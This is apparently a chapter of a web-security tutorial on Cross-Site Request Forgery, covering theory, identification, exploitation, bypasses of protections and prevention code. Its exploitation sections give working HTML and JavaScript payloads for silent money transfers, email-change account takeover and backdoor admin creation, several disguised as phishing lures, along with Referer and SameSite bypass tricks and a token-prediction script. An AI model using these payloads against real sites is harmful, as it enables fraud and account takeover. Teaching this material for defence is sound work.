# 8. CSRF - CROSS-SITE REQUEST FORGERY <a name="csrf"></a>

## 8.1 THEORY & BACKGROUND

### What is CSRF?

**Cross-Site Request Forgery (CSRF)** forces authenticated users to perform unintended actions on a web application.

**How it works:**
1. Victim is authenticated to vulnerable site
2. Victim visits attacker's site
3. Attacker's site makes request to vulnerable site
4. Victim's browser automatically includes session cookies
5. Action performed as victim without their knowledge

**Requirements:**
- Victim must be authenticated (have active session)
- Application must rely solely on session cookies for authentication
- Attacker must know the request format
- No CSRF protection in place

### The Role of Sessions

**Sessions enable CSRF:**
- Session cookies automatically sent with requests
- Browser doesn't distinguish between legitimate and forged requests
- Same-origin policy doesn't prevent sending cookies

---

## 8.2 IDENTIFICATION

### 8.2.1 Recognizing Vulnerable Requests

**CSRF vulnerable characteristics:**

```bash
# 1. State-changing action (not GET for sensitive operations)
POST /transfer HTTP/1.1
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

from=123456&to=999999&amount=1000

# 2. No CSRF token
# No parameter like: csrf_token=xyz123

# 3. No custom headers
# Relies only on cookies, not Authorization header

# 4. Predictable parameters
# Attacker can construct valid request
```

**Testing procedure:**

```bash
# 1. Perform action while authenticated
# Example: Change email

POST /update-email HTTP/1.1
Cookie: session=abc123

email=newemail@test.com

# 2. Check for CSRF protection:
# - CSRF token in request? No → Likely vulnerable
# - Referer header check? Test with no referer
# - Custom headers? No → Vulnerable
# - Double-submit cookie? No → Vulnerable

# 3. Recreate request from attacker's site
# If successful → CSRF vulnerability confirmed
```

---

## 8.3 EXPLOITATION

### 8.3.1 Basic CSRF Attack

**Auto-submitting Form:**

```html
<!-- Attacker's page: csrf.html -->
<html>
<body>
<h1>Free Gift! Click Claim Below</h1>

<form id="csrf" action="http://vulnerable-bank.com/transfer" method="POST">
    <input type="hidden" name="to_account" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
</form>

<script>
// Auto-submit on page load
document.getElementById('csrf').submit();
</script>

</body>
</html>

<!-- Victim visits csrf.html while logged into bank -->
<!-- Form auto-submits → Money transferred! -->
```

**Image Tag CSRF (GET request):**

```html
<!-- For GET-based actions (poor design but exists) -->
<img src="http://vulnerable-site.com/delete-account?confirm=yes" style="display:none;">

<!-- Or in email: -->
<img src="http://vulnerable-site.com/admin/create-user?username=hacker&password=pass&role=admin" width="1" height="1">
```

**AJAX CSRF:**

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://vulnerable-site.com/transfer", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.withCredentials = true; // Include cookies
xhr.send("to=attacker&amount=10000");
</script>
```

### 8.3.2 Advanced CSRF Techniques

**Bypass Referer Check:**

```html
<!-- If application checks Referer header -->

<!-- Method 1: No referer -->
<meta name="referrer" content="no-referrer">
<form action="http://vulnerable-site.com/action" method="POST">
    <input type="hidden" name="param" value="value">
</form>
<script>document.forms[0].submit();</script>

<!-- Method 2: Data URI (no referer sent) -->
<iframe src="data:text/html,<form action='http://vulnerable-site.com/action' method='POST'><input name='param' value='value'></form><script>document.forms[0].submit()</script>">
</iframe>

<!-- Method 3: HTTPS to HTTP (referer not sent) -->
<!-- Host attacker page on HTTPS -->
<!-- Target HTTP site (referer stripped) -->
```

**JSON CSRF:**

```html
<!-- If API accepts JSON -->
<script>
fetch('http://vulnerable-api.com/update', {
    method: 'POST',
    credentials: 'include', // Send cookies
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        email: 'attacker@evil.com',
        role: 'admin'
    })
});
</script>

<!-- Alternative using XMLHttpRequest -->
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://vulnerable-api.com/update", true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send('{"email":"attacker@evil.com","role":"admin"}');
</script>
```

**Form Encoding Tricks:**

```html
<!-- If Content-Type validation is weak -->

<!-- Standard form -->
<form action="http://site.com/api/update" method="POST" enctype="text/plain">
    <input name='{"email":"attacker@evil.com","ignore_me":"' value='"}' type='hidden'>
</form>

<!-- Sends JSON-like data:
{"email":"attacker@evil.com","ignore_me":"="}
-->

<script>document.forms[0].submit();</script>
```

**Cross-Protocol CSRF:**

```html
<!-- CSRF to non-HTTP protocols -->

<!-- FTP (if browser allows) -->
<form action="ftp://vulnerable-server.com/upload" method="POST">
    <input name="file" value="malicious_content">
</form>

<!-- File protocol (file://) -->
<iframe src="file:///etc/passwd"></iframe>
```

### 8.3.3 CSRF with XSS

**Combining CSRF and XSS:**

```html
<!-- Stored XSS that performs CSRF -->
<script>
// Injected via XSS vulnerability
var xhr = new XMLHttpRequest();
xhr.open("POST", "/admin/create-user", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("username=backdoor&password=pass&role=admin");
</script>

<!-- When admin views this comment/post → backdoor account created -->
```

---

## 8.4 REAL-WORLD SCENARIOS

### 8.4.1 Account Takeover via Email Change

**Attack flow:**

```html
<!-- 1. Attacker creates malicious page -->
<!-- csrf-email-change.html -->
<html>
<body>
<h1>Congratulations! You won!</h1>
<p>Processing your reward...</p>

<form id="csrf" action="https://victim-site.com/account/update-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>

<script>
setTimeout(function() {
    document.getElementById('csrf').submit();
}, 1000);
</script>

</body>
</html>

<!-- 2. Victim is logged into victim-site.com -->
<!-- 3. Attacker sends phishing email: "Click to claim prize!" -->
<!-- 4. Victim clicks → csrf-email-change.html loads -->
<!-- 5. Form auto-submits → Email changed to attacker@evil.com -->
<!-- 6. Attacker uses "Forgot Password" → Password reset sent to attacker@evil.com -->
<!-- 7. Attacker resets password → Account compromised! -->
```

### 8.4.2 Money Transfer

```html
<!-- Bank transfer CSRF -->
<html>
<body>
<h1>Free Money System</h1>
<p>Loading your account...</p>

<form id="transfer" action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to_account" value="ATTACKER_ACCOUNT">
    <input type="hidden" name="amount" value="5000">
    <input type="hidden" name="description" value="Payment">
</form>

<script>
// Wait 2 seconds (let page appear legitimate)
setTimeout(function() {
    document.getElementById('transfer').submit();
}, 2000);
</script>
</body>
</html>
```

### 8.4.3 Admin Privilege Escalation

```html
<!-- CSRF to add admin user -->
<html>
<body>
<!-- Hidden iframes for stealth -->
<iframe style="display:none;" name="csrf-frame"></iframe>

<form id="admin-csrf" 
      action="http://admin-panel.com/users/create" 
      method="POST" 
      target="csrf-frame">
    <input type="hidden" name="username" value="backdoor">
    <input type="hidden" name="password" value="BackdoorPass123!">
    <input type="hidden" name="role" value="administrator">
    <input type="hidden" name="email" value="backdoor@temp.com">
</form>

<script>
// Submit form silently
document.getElementById('admin-csrf').submit();
</script>

<!-- User sees nothing, admin account created in background -->
</body>
</html>
```

---

## 8.5 CSRF PROTECTION BYPASS

### 8.5.1 Weak Token Implementation

**Token in URL instead of POST body:**

```bash
# Vulnerable:
POST /transfer HTTP/1.1
Cookie: session=abc123

to=999999&amount=1000&csrf_token=xyz123

# Token in URL:
POST /transfer?csrf_token=xyz123 HTTP/1.1

# Attack:
# Referer header leaks token!
<form action="http://bank.com/transfer?csrf_token=LEAKED_TOKEN" method="POST">
```

**Token Validation Logic Flaw:**

```bash
# If application only validates token when present:

# Normal request:
POST /transfer
csrf_token=abc123&to=999&amount=1000

# Attack: Simply omit token
POST /transfer
to=999&amount=1000

# If token not required when missing → Bypass!
```

**Predictable Token:**

```python
# If token is predictable (e.g., MD5 of timestamp)
import hashlib, time

# Predict token
timestamp = int(time.time())
predicted_token = hashlib.md5(str(timestamp).encode()).hexdigest()

# Use in attack
```

### 8.5.2 SameSite Cookie Bypass

**SameSite=None cookies:**

```bash
# If cookie has SameSite=None
Set-Cookie: session=abc123; SameSite=None; Secure

# CSRF still possible from cross-site requests!
```

**SameSite=Lax bypass:**

```html
<!-- SameSite=Lax allows GET requests from other sites -->

<!-- If application uses GET for state change: -->
<img src="http://vulnerable-site.com/delete-account?confirm=yes">

<!-- Or: -->
<a href="http://vulnerable-site.com/transfer?to=attacker&amount=1000">
Click here!
</a>
<!-- When clicked, cookies sent with GET request -->
```

**Top-level navigation trick:**

```html
<!-- SameSite=Lax allows cookies on top-level navigation -->
<script>
window.open('http://vulnerable-site.com/dangerous-action');
</script>

<!-- Or: -->
<a href="http://vulnerable-site.com/dangerous-action" target="_blank">
Click for surprise!
</a>
```

---

## 8.6 PREVENTION

**Proper CSRF Protection:**

```php
// PHP Implementation

// 1. Generate token on form display
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// In HTML form:
?>
<form method="POST" action="/transfer">
    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
    <input type="text" name="to_account">
    <input type="number" name="amount">
    <input type="submit">
</form>
<?php

// 2. Validate token on form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        die('CSRF token validation failed');
    }
    
    // Token valid, process request
    // After processing, regenerate token
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
```

```javascript
// JavaScript/Node.js Implementation

const express = require('express');
const session = require('express-session');
const csrf = require('csurf');

const app = express();

// Setup CSRF protection
const csrfProtection = csrf({ cookie: false }); // Use session

app.use(session({
    secret: 'your-secret-key',
    resave: false,
    saveUninitialized: true
}));

// Display form
app.get('/form', csrfProtection, (req, res) => {
    res.send(`
        <form method="POST" action="/submit">
            <input type="hidden" name="_csrf" value="${req.csrfToken()}">
            <input type="text" name="data">
            <input type="submit">
        </form>
    `);
});

// Process form
app.post('/submit', csrfProtection, (req, res) => {
    // Token automatically validated by middleware
    // If invalid, 403 error returned
    res.send('Success!');
});
```

**Additional Protection Methods:**

```javascript
// 1. SameSite Cookies
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly

// 2. Custom Request Headers (for AJAX)
// Client must set custom header
xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');

// Server validates header exists
if (!req.headers['x-requested-with']) {
    return res.status(403).send('Forbidden');
}

// 3. Double Submit Cookie
// Send token in both cookie and request parameter
// Server validates they match

// 4. Origin/Referer Header Validation
const origin = req.headers.origin || req.headers.referer;
if (!origin || !origin.startsWith('https://trusted-site.com')) {
    return res.status(403).send('Forbidden');
}
```

---
